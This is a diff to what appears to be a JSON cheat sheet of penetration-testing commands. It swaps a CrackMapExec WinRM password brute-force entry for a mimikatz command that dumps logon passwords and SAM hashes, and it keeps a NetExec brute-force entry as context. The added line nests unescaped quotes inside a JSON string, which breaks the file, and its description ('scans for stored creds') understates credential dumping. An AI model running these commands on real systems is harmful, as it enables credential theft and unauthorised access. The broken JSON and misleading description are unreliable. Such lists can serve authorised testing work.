@@ -173,9 +173,9 @@
       "description": "Perform WinRM local credential brute-force/enumeration using NetExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
     },
     {
-      "os": "Linux",
-      "cmd": "crackmapexec winrm {RHOST} -u users.txt -p pass.txt --continue-on-success",
-      "description": "Perform WinRM local credential brute-force/enumeration using CrackMapExec against a target host, reading credentials from 'users.txt' and 'pass.txt' and continuing on success."
+      "os": "Windows",
+      "cmd": "./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"",
+      "description": "Perform scans for stored creds and hashes."
     }
   ],
   "miscellaneous_system_control": [
